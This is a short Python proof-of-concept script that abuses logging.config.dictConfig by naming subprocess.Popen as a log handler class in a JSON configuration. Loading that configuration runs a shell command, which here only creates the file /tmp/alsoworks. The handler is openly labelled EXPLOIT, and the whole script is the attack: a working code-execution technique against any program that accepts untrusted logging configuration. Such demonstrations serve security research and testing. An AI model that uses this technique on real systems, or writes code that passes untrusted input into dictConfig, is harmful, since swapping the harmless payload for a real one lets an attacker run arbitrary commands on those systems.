import logging.config
import json

log_config_txt = '''{
    "version":1,
    "root":{
        "handlers" : ["EXPLOIT"]
    },
    "handlers":{
        "EXPLOIT":{
            "class": "subprocess.Popen",
            "args" : "touch /tmp/alsoworks",
            "shell" : "True"
        }
    }
}
'''

log_config = json.loads(log_config_txt)
logging.config.dictConfig(log_config)